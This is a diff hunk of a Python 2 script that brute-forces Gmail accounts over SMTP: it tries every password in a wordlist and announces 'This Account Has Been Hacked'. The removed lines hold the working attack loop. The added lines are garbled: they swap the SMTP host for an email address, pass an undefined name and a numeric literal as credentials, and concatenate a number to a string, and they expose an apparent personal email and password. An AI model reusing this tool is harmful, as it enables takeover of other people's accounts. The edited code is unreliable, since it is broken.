@@ -48,25 +48,25 @@ pass_file = open(file_path,'r')
 pass_list = pass_file.readlines()
 def login():
     i = 0
-    user_name = raw_input('target email :')
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    user_name = raw_input('Waniesajer00@gmailmcom:')
+    server = smtplib.SMTP_SSL('waniesajer00@gmail.com', 465)
     server.ehlo()
     for password in pass_list:
       i = i + 1
       print str(i) + '/' + str(len(pass_list))
       try:
-         server.login(user_name, password)
+         server.login(waniesajer00, 03119701)
          system('clear')
          main()
          print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         print '[+] This Account Has Been Hacked Password :' + 03119701 + '     ^_^'
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
+            print '[+] this account has been hacked, password :' + 03119701 + '     ^_^'
 
             break
          else:
